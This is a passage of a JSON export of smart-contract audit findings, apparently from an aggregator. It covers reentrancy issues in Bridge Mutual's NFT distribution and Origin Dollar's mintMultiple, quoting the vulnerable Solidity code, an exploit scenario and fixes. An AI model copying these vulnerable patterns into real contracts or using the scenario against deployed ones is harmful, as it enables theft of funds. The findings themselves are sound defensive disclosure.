      "source_link": "https://code4rena.com/reports/2021-09-defiprotocol",
      "github_link": "https://github.com/code-423n4/2021-09-defiprotocol-findings/issues/223",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "36",
      "slug": "h-01-re-entrancy-in-settleauction-allow-stealing-all-funds-code4rena-kuiper-kuiper-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Kuiper",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Kuiper",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield Aggregator"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "13488",
      "kind": "MARKDOWN",
      "auditfirm_id": "8",
      "impact": "HIGH",
      "finders_count": 2,
      "protocol_id": "460",
      "title": "Re-entrancy issue for ERC1155 ✓ Fixed",
      "content": "#### Resolution\n\n\n\nAddressed by moving `isNFTDistributed = true;` before the token transfers and only transferring tokens to the message sender.\n\n\n#### Description\n\n\nERC1155 tokens have callback functions on some of the transfers, like `safeTransferFrom`, `safeBatchTransferFrom`. During these transfers, the `IERC1155ReceiverUpgradeable(to).onERC1155Received` function is called in the `to` address.\n\n\nFor example, `safeTransferFrom` is used in the `LiquidityMining` contract:\n\n\n**code/contracts/LiquidityMining.sol:L204-L224**\n\n\n\n```\nfunction distributeAllNFT() external {\n    require(block.timestamp > getEndLMTime(),\n        \"2 weeks after liquidity mining time has not expired\");\n    require(!isNFTDistributed, \"NFT is already distributed\");\n\n    for (uint256 i = 0; i < leaderboard.length; i++) {\n        address[] memory \\_groupLeaders = groupsLeaders[leaderboard[i]];\n\n        for (uint256 j = 0; j < \\_groupLeaders.length; j++) {\n            \\_sendNFT(j, \\_groupLeaders[j]);\n        }\n    }\n\n    for (uint256 i = 0; i < topUsers.length; i++) {\n        address \\_currentAddress = topUsers[i];\n        LMNFT.safeTransferFrom(address(this), \\_currentAddress, 1, 1, \"\");\n        emit NFTSent(\\_currentAddress, 1);\n    }\n\n    isNFTDistributed = true;\n}\n\n```\nDuring that transfer, the `distributeAllNFT`  function can be called again and again. So multiple transfers will be done for each user.\n\n\nIn addition to that, any receiver of the tokens can revert the transfer. If that happens, nobody will be able to receive their tokens.\n\n\n#### Recommendation\n\n\n* Add a reentrancy guard.\n* Avoid transferring tokens for different receivers in a single transaction.",
      "summary": "\nThis bug report is about an issue with ERC1155 tokens and their callback functions. When `safeTransferFrom` is used in the `LiquidityMining` contract, multiple transfers are done for each user and any receiver of the tokens can revert the transfer. This results in nobody being able to receive their tokens. To resolve this issue, the code was changed to move the `isNFTDistributed = true;` before the token transfers and only transferring tokens to the message sender. To prevent this issue from occurring in the future, it is recommended to add a reentrancy guard and to avoid transferring tokens for different receivers in a single transaction.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "https://consensys.net/diligence/audits/2021/03/bridge-mutual/",
      "github_link": "",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "",
      "slug": "re-entrancy-issue-for-erc1155-fixed-consensys-bridge-mutual-markdown",
      "firm_name": "ConsenSys",
      "firm_logo_square": "consensys_square.png",
      "protocol_name": "Bridge Mutual",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "ConsenSys",
        "logo_square": "consensys_square.png"
      },
      "protocols_protocol": {
        "name": "Bridge Mutual",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Insurance"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        },
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        }
      ]
    },
    {
      "id": "18201",
      "kind": "PDF",
      "auditfirm_id": "9",
      "impact": "HIGH",
      "finders_count": 2,
      "protocol_id": "817",
      "title": "Reentrancy and untrusted contract call in mintMultiple Diﬃculty: Low",
      "content": "## Data Validation\n\n**Target:** MixOracle.sol\n\n**Difficulty:** High\n\n## Description\n\nMissing checks and no reentrancy prevention allow untrusted contracts to be called from `mintMultiple`. This could be used by an attacker to drain the contracts.\n\n```solidity\nfunction mintMultiple (\n    address[] calldata _assets,\n    uint256[] calldata _amounts\n) external whenNotDepositPaused {\n    require(_assets.length == _amounts.length, \"Parameter length mismatch\");\n    uint256 priceAdjustedTotal = 0;\n    uint256[] memory assetPrices = _getAssetPrices(false);\n    \n    for (uint256 i = 0; i < allAssets.length; i++) {\n        for (uint256 j = 0; j < _assets.length; j++) {\n            if (_assets[j] == allAssets[i]) {\n                if (_amounts[j] > 0) {\n                    uint256 assetDecimals = Helpers.getDecimals(allAssets[i]);\n                    uint256 price = assetPrices[i];\n                    if (price > 1e18) {\n                        price = 1e18;\n                    }\n                    priceAdjustedTotal += _amounts[j].mulTruncateScale(price, 10 ** assetDecimals);\n                }\n            }\n        }\n    }\n    \n    // Rebase must happen before any transfers occur.\n    if (priceAdjustedTotal > rebaseThreshold && !rebasePaused) {\n        rebase(true);\n    }\n    \n    for (uint256 i = 0; i < _assets.length; i++) {\n        IERC20 asset = IERC20(_assets[i]);\n        asset.safeTransferFrom(msg.sender, address(this), _amounts[i]);\n    }\n    \n    oUSD.mint(msg.sender, priceAdjustedTotal);\n    emit Mint(msg.sender, priceAdjustedTotal);\n    \n    if (priceAdjustedTotal >= autoAllocateThreshold) {\n        allocate();\n    }\n}\n```\n\n*Figure 10.1: VaultCore.sol#L84-L127*\n\nIf an asset is not supported the first two loops will skip it. Likewise, if the amount is zero the first two loops will skip it. Compare this to the `mint` function which will revert if any of these two checks fail.\n\nUnlike the first two loops, the third loop will not skip unsupported assets. This loop will call a function with the ERC20 `transferFrom` signature on each of the passed in asset addresses. An attacker could create a custom contract with such a function and it will be called. The attacker is free to do as he pleases within this function.\n\nThere are no reentrancy guards in the `VaultCore` contract and thus the above custom contract could call back into any of the `VaultCore` functions. Had there been reentrancy protection the attacker contract would not be able to call back into the `VaultCore` contract, severely limiting his abilities.\n\nThe third loop will transfer any assets into the `VaultCore` contract. However, only after the third loop is the corresponding OUSD minted. This creates a temporary imbalance between the assets transferred into `VaultCore`, and the minted OUSD. If an attacker contract is called inside this loop he could exploit this temporary imbalance.\n\n## Exploit Scenario\n\nAn attacker creates a custom contract containing a `transferFrom` function which calls `Vault.mint`. The attacker calls `mintMultiple` passing in USDT as the first asset and his custom contract as the second asset. The `mintMultiple` function will first transfer the USDT into the `VaultCore` contract, followed by calling the custom contract’s `transferFrom` function. This function calls `Vault.mint` which triggers a rebase. Since the USDT already got transferred into the `VaultCore` contract, but no corresponding OUSD was minted, the imbalance will cause the rebase to function unexpectedly.\n\n## Recommendation\n\n**Short term:** Add checks that cause `mintMultiple` to revert if the amount is zero or the asset is not supported. Add a reentrancy guard to the `mint`, `mintMultiple`, `redeem`, and `redeemAll` functions.\n\n**Long term:** Make use of Slither which will flag the reentrancy. Or even better, use Crytic and incorporate static analysis checks into your CI/CD pipeline. Add reentrancy guards to all non-view functions callable by anyone. Make sure to always revert a transaction if an input is incorrect. Disallow calling untrusted contracts.",
      "summary": "\nA bug was found in the MixOracle.sol contract, which has a high difficulty level. The bug is caused by missing checks and lack of reentrancy prevention in the mintMultiple function. This means that untrusted contracts can be called from the mintMultiple function, which can be used by an attacker to drain the contract.\n\nThe mintMultiple function calls a function with the ERC20 transferFrom signature on each of the passed-in asset addresses. An attacker can create a custom contract with this function, which will be called by the mintMultiple function. Without reentrancy protection, the attacker contract can call back into any of the VaultCore contract functions, allowing the attacker to exploit the imbalance between the assets transferred into VaultCore and the minted OUSD.\n\nTo fix the bug, short-term checks should be added to the mintMultiple function to revert if the amount is zero or the asset is not supported. Additionally, a reentrancy guard should be added to the mint, mintMultiple, redeem, and redeemAll functions. Long-term, static analysis checks should be incorporated into the CI/CD pipeline, and reentrancy guards should be added to all non-view functions callable by anyone. Lastly, calling untrusted contracts should be disallowed.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "https://github.com/trailofbits/publications/blob/master/reviews/OriginDollar.pdf",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/OriginDollar.pdf",
      "github_link": "",
      "pdf_link": "https://solodit-bucket.s3.amazonaws.com/storage/reports/trailofbits/OriginDollar.pdf",
      "pdf_page_from": 33,
      "contest_id": "",
      "slug": "reentrancy-and-untrusted-contract-call-in-mintmultiple-difficulty-low-trailofbits-origin-dollar-pdf",
      "firm_name": "TrailOfBits",
      "firm_logo_square": "trailofbits_square.png",
      "protocol_name": "Origin Dollar",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "TrailOfBits",
        "logo_square": "trailofbits_square.png"
      },
      "protocols_protocol": {
        "name": "Origin Dollar",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    }
  ]
}